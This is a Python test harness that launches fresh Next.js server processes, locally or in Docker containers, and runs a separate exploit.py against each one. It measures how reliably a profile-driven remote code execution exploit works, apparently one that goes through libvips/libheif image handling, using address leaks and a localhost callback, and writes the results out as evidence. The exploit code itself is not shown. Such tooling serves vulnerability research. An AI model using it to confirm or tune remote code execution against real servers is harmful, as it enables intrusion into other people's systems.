#!/usr/bin/env python3
"""Run classified profile-driven RCE against distinct fresh processes."""

from __future__ import annotations

import argparse
import hashlib
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.request


HERE = Path(__file__).resolve().parents[1]
LAB = HERE / "lab"
DEFAULT_NODE = Path.home() / ".nvm/versions/node/v25.8.1/bin/node"
sys.path.insert(0, str(HERE))

from stack_profile import ProfileError, load_manifest  # noqa: E402


def sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for block in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(block)
    return digest.hexdigest()


def wait_for_server(url: str, process: subprocess.Popen[str],
                    timeout: float = 30) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if process.poll() is not None:
            output = process.stdout.read() if process.stdout else ""
            raise RuntimeError(
                f"server exited before readiness ({process.returncode}):\n{output}",
            )
        try:
            with urllib.request.urlopen(url, timeout=1) as response:
                if response.status == 200:
                    return
        except (OSError, urllib.error.URLError):
            time.sleep(0.1)
    raise RuntimeError("timed out waiting for the Next.js server")


def stop_server(process: subprocess.Popen[str],
                container_name: str | None = None) -> int | None:
    if container_name is not None and process.poll() is None:
        subprocess.run(
            ["docker", "stop", "--timeout", "2", container_name],
            capture_output=True,
            text=True,
            check=False,
        )
    try:
        return process.wait(timeout=3)
    except subprocess.TimeoutExpired:
        process.terminate()
        try:
            return process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            process.kill()
            return process.wait(timeout=5)


def compact_classification_attempts(result: dict[str, object]) -> None:
    """Keep multi-process evidence reviewable without dropping decisions."""
    classification = result.get("classification")
    if not isinstance(classification, dict):
        return
    attempts = classification.get("attempts")
    if not isinstance(attempts, list):
        return
    fields = (
        "attempt", "status", "supported_pair_count", "selected_profile_id",
        "selected_base", "rejected_candidates",
    )
    classification["attempts"] = [
        {field: attempt.get(field) for field in fields if field in attempt}
        for attempt in attempts
        if isinstance(attempt, dict)
    ]


def run_lifetime(args: argparse.Namespace, lifetime: int,
                 temporary: Path) -> dict[str, object]:
    target = f"http://127.0.0.1:{args.port}"
    callback_port = args.callback_port + lifetime - 1
    container_name = None
    command = [
        str(args.node),
        "node_modules/next/dist/bin/next",
        "start",
        "-p",
        str(args.port),
    ]
    cwd = LAB
    if args.docker_image:
        container_name = f"libheif-grid-validation-{os.getpid()}-{lifetime}"
        command = [
            "docker", "run", "--rm", "--name", container_name,
            "--network", "host", args.docker_image,
            "node", "node_modules/next/dist/bin/next", "start", "-p",
            str(args.port),
        ]
        cwd = HERE
    server = subprocess.Popen(
        command,
        cwd=cwd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    server_output = ""
    result: dict[str, object] = {"success": False}
    try:
        wait_for_server(target, server)
        result_path = temporary / f"lifetime-{lifetime}.json"
        command = [
            sys.executable,
            str(HERE / "exploit.py"),
            "--target",
            target,
            "--callback-host",
            "127.0.0.1",
            "--callback-port",
            str(callback_port),
            "--profile-manifest",
            str(args.manifest),
            "--json-output",
            str(result_path),
            "--leak-attempts",
            str(args.leak_attempts),
            "--concise",
        ]
        if args.profile:
            command.extend(["--profile", args.profile])
        completed = subprocess.run(
            command,
            cwd=HERE,
            capture_output=True,
            text=True,
            timeout=args.exploit_timeout,
        )
        if result_path.exists():
            result = json.loads(result_path.read_text(encoding="utf-8"))
        else:
            result = {"success": False}
        result.update({
            "lifetime": lifetime,
            "exploit_exit": completed.returncode,
        })
        callback = result.get("callback")
        if isinstance(callback, dict):
            callback.pop("data", None)
        compact_classification_attempts(result)
        if completed.returncode != 0:
            result["exploit_stdout"] = completed.stdout
            result["exploit_stderr"] = completed.stderr
    finally:
        server_exit = stop_server(server, container_name)
        if server.stdout:
            server_output = server.stdout.read()
            server.stdout.close()
    result["server_exit"] = server_exit
    if result.get("success") is not True:
        result["server_output"] = server_output
    return result


def main() -> int:
    parser = argparse.ArgumentParser(
        description=(
            "Validate profile classification and RCE across fresh stock "
            "server processes"
        ),
    )
    parser.add_argument("--lifetimes", type=int, default=10)
    parser.add_argument("--port", type=int, default=3215)
    parser.add_argument("--callback-port", type=int, default=30000)
    parser.add_argument("--node", type=Path, default=DEFAULT_NODE)
    parser.add_argument(
        "--docker-image",
        help="start each lifetime in a new host-networked container",
    )
    parser.add_argument(
        "--manifest", type=Path,
        default=HERE / "profiles/native_stack_profiles.json",
    )
    parser.add_argument("--profile")
    parser.add_argument("--exploit-timeout", type=float, default=90)
    parser.add_argument("--leak-attempts", type=int, default=128)
    parser.add_argument(
        "--output", type=Path,
        default=HERE / "evidence/libvips-gmodule-rce-10x.json",
    )
    args = parser.parse_args()
    if args.lifetimes < 1:
        parser.error("--lifetimes must be positive")
    if args.leak_attempts < 1:
        parser.error("--leak-attempts must be positive")
    try:
        manifest = load_manifest(args.manifest)
    except ProfileError as error:
        parser.error(str(error))
    image_id = None
    if args.docker_image:
        identity = subprocess.run(
            [
                "docker", "run", "--rm", "--entrypoint", "sha256sum",
                args.docker_image, "/usr/bin/node",
            ],
            check=True,
            capture_output=True,
            text=True,
        ).stdout.split()[0]
        image_id = subprocess.run(
            ["docker", "image", "inspect", args.docker_image, "--format", "{{.Id}}"],
            check=True,
            capture_output=True,
            text=True,
        ).stdout.strip()
        actual_node_sha256 = identity
    else:
        actual_node_sha256 = sha256(args.node)
    candidate_profiles = (
        [manifest.profiles[args.profile]]
        if args.profile in manifest.profiles else []
    ) if args.profile else list(manifest.profiles.values())
    matching_nodes = [
        profile for profile in candidate_profiles
        if profile.node.sha256 == actual_node_sha256
    ]
    if len(matching_nodes) != 1:
        parser.error(
            "--node SHA-256 must match exactly one selected manifest profile",
        )
    expected_profile_id = matching_nodes[0].profile_id

    results: list[dict[str, object]] = []
    with tempfile.TemporaryDirectory(prefix="libheif-grid-validation-") as directory:
        temporary = Path(directory)
        for lifetime in range(1, args.lifetimes + 1):
            print(f"[run {lifetime}/{args.lifetimes}] starting fresh server")
            result = run_lifetime(args, lifetime, temporary)
            results.append(result)
            print(
                f"[run {lifetime}/{args.lifetimes}] "
                f"success={result.get('success')} "
                f"base={result.get('libvips_base')} "
                f"selected_attempt="
                f"{result.get('classification', {}).get('selected_attempt')}",
                flush=True,
            )

    successes = sum(result.get("success") is True for result in results)
    correct_profile_selections = sum(
        result.get("classification", {}).get("selected_profile_id")
        == expected_profile_id
        for result in results
    )
    report = {
        "profile_manifest": str(args.manifest.resolve()),
        "expected_profile_id": expected_profile_id,
        "profile_id": expected_profile_id,
        "node_binary": (
            f"{args.docker_image}:/usr/bin/node"
            if args.docker_image else str(args.node.resolve())
        ),
        "node_sha256": actual_node_sha256,
        "node_identity_verified": True,
        "docker_image": args.docker_image,
        "docker_image_id": image_id,
        "remote_profile_selection": args.profile is None,
        "profile_restriction": args.profile,
        "leak_attempt_limit": args.leak_attempts,
        "exploit_timeout_seconds": args.exploit_timeout,
        "target_port": args.port,
        "callback_port_start": args.callback_port,
        "profile_manifest_sha256": sha256(args.manifest),
        "node_profile": results[0].get("node_profile") if results else None,
        "stock_environment": (
            results[0].get("node_profile", {}).get("elf_type") == "ET_EXEC"
            if results else None
        ),
        "lifetimes": args.lifetimes,
        "successes": successes,
        "success_rate": successes / args.lifetimes,
        "correct_profile_selections": correct_profile_selections,
        # Kept for consumers of the original evidence schema. The value now
        # counts correct, non-null selections rather than None == None.
        "unique_profile_selections": correct_profile_selections,
        "distinct_libvips_bases": len({
            result.get("libvips_base") for result in results
            if result.get("libvips_base")
        }),
        "distinct_control_target_addresses": len({
            result.get("control_target", {}).get("address")
            for result in results
            if result.get("control_target", {}).get("address")
        }),
        "results": results,
    }
    args.output.parent.mkdir(parents=True, exist_ok=True)
    args.output.write_text(json.dumps(report, indent=2) + "\n", encoding="utf-8")
    print(json.dumps({key: report[key] for key in (
            "profile_id", "lifetimes", "successes", "success_rate",
            "unique_profile_selections", "distinct_libvips_bases",
            "distinct_control_target_addresses",
    )}, indent=2))
    return 0 if (
        successes == args.lifetimes
        and correct_profile_selections == args.lifetimes
    ) else 1


if __name__ == "__main__":
    raise SystemExit(main())
